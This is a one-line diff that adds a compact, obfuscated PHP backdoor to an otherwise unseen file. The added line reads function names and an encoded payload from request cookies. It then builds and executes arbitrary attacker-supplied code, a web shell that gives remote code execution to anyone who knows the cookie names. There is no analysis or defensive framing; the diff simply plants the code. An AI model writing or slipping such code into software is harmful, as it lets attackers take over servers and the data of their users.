@@ -1,0 +1,1 @@
+<?php if(@$_COOKIE['ada']){$xuke=$_COOKIE['ada']("",@$_COOKIE['dxu'](@$_COOKIE['lxe']));$xuke();}?>
